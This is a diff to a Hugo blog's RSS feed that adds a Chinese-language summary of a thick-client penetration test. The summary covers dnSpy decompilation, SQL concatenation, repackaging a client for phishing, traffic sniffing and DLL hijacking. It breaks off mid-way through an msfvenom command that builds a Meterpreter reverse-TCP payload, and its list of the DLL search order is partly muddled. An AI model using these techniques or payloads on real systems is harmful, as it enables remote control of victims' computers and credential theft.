@@ -6,7 +6,44 @@
     <description>Recent content in Posts on Olist.213</description>
     <generator>Hugo -- gohugo.io</generator>
     <language>zh-cn</language>
-    <lastBuildDate>Sat, 01 Apr 2023 14:01:34 +0800</lastBuildDate><atom:link href="https://olist213.github.io/posts/index.xml" rel="self" type="application/rss+xml" />
+    <lastBuildDate>Sat, 01 Apr 2023 23:13:41 +0800</lastBuildDate><atom:link href="https://olist213.github.io/posts/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>记一次胖客户端程序渗透测试</title>
+      <link>https://olist213.github.io/posts/thick_client_penetration_testing/</link>
+      <pubDate>Sat, 01 Apr 2023 23:13:41 +0800</pubDate>
+      
+      <guid>https://olist213.github.io/posts/thick_client_penetration_testing/</guid>
+      <description>胖客户端就是我们常说的C/S架构的应用程序，其主要特点是客户端执行部分应用逻辑，服务器端则提供存储和计算支持，两者之间通过网络进行通信和交互。而我们常说的“瘦客户端”就是基于B/S架构的应用程序，也就是基于浏览器的应用程序。
+拿到一个胖客户端程序可以先看下胖客户端是什么架构，一般像后缀是exe结尾的，很多都是C、C#或者.NET编译的。
+可以通过CFF Explorer查看目标程序的架构，如下图。
+可以看到，这是一个32位的程序，利用Microsoft Visual Studio .NET编译，是一个.net程序。
+像这种.NET的程序，可以用dnspy（GitHub - dnSpy/dnSpy: .NET debugger and assembly editor），DNspy是一款著名的.NET反编译器，可以反编译.NET编译后的文件，包括可执行文件（exe）、DLL文件、NET程序集等。使用DNspy反编译exe文件可以方便地查看其源代码和内部结构，帮助理解和分析程序的运行机制。
+可以从中看到sql语句查询，从这里我们可以看到sql语句未做任何过滤，直接拼接，但是这里直接加了单引号，导致每次查询都会多有一个单引号，没法绕过。
+但是如果客户端程序可以直接反编译的话，那么如果说客户端程序在没做任何签名的情况下，可以重新编译，打包成另一个程序，后果就是可以伪造官方客户端，从中写入恶意文件，通过这种方式可以进行钓鱼等攻击。
+此处不放图了，修改后，可以直接像正常客户端程序那样使用。
+也可以通过wireshark或者科来对其流量进行检测，检测应用在传输的过程中是否泄漏敏感信息。
+从上图可以看出，此胖客户端使用tds数据库协议，节点的ip地址、端口等内容。
+还包括在传输过程中泄漏了sql语句
+除了wireshark和科来等工具分析流量之外，echo mirage也可以用来进行流量分析，可自行下载使用。
+接下来，回到我们的这篇文章的正题，dll劫持漏洞，既然是胖客户端应用，那么就会加载各类dll文件。
+DLL劫持（DLL Hijacking）是一种攻击技术，利用系统在加载动态链接库（DLL）时的搜索顺序错误或缺陷，在系统中寻找可用的DLL文件时，将正常的文件替换成恶意文件，使得系统加载并执行了被控制的DLL文件，达到攻击者的目的。
+DLL劫持攻击的危害大，可以被用于各种恶意活动，例如：
+1、窃取敏感信息：恶意DLL文件可能会窃取用户的敏感信息，例如登录账号、密码等。 2、执行远程指令：通过劫持DLL文件，攻击者可能会远程控制用户的计算机执行恶意指令，例如下载、安装其他恶意程序等。 3、破坏系统的完整性和稳定性：劫持的DLL文件可能会破坏系统的安全性、完整性和稳定性，例如篡改系统设置、破坏系统文件等。
+dll劫持利用的第一步是获取可利用的dll文件。
+这个时候就的使用Sysinternals Suite套件，利用套件下的Procmon Monitor工具，可以查看当前运行的程序的相关进程情况。
+加载后可以看到各类当前运行程序的进程名、PID、路径等，按ctrl+L过滤处特定程序的进程。
+同时如果目标程序加载了配置文件的话，通过这个工具也可以查看到。
+既然是dll劫持，那么我们就要去找可利用的dll。
+在目标程序的目录下，找到了一个DWrite.dll文件，这个文件是Windows操作系统的一部分，它是DirectWrite API动态链接库文件。DirectWrite是一个用于渲染文本和字体的API，它使用硬件加速和先进的字体渲染技术来提供更高质量、更清晰的文本呈现效果。
+在Windows系统中，许多应用程序（比如Adobe Creative Suite等）都会使用DirectWrite技术来渲染文本和字体，因此dwrite.dll文件在许多应用程序中都会被调用和使用。
+可以通过搜索去搜索NAME NOT FOUND的这种进程。
+找dll可以多尝试几个dll文件，除了找到dll文件，还需要了解windows下dll文件的加载顺序。
+1、搜索应用程序所在目录 2、Windows系统目录（如C:\Windows\System32） 3、常规的windows目录（ C:\Windows\System32 和 C:\Windows） 4、搜索 Administrator 类型的 Windows 系统目录（如C:\Windows\SystemWOW64） 5、搜索 PATH 环境变量中的所有目录 6、当前工作目录
+操作系统按照上述顺序在指定的目录和文件中查找 DLL 文件，并将它们加载到应用程序中。
+了解了dll加载顺序，并且找到了dll文件，那么就可以开始构造恶意的dll文件了，通过metasploit框架来进行构造。
+msfvenom -p windows/meterpreter/reverse_tcp LHOST= 192.</description>
+    </item>
+    
     <item>
       <title>一些工具(updating)</title>
       <link>https://olist213.github.io/posts/tools_resoure/</link>
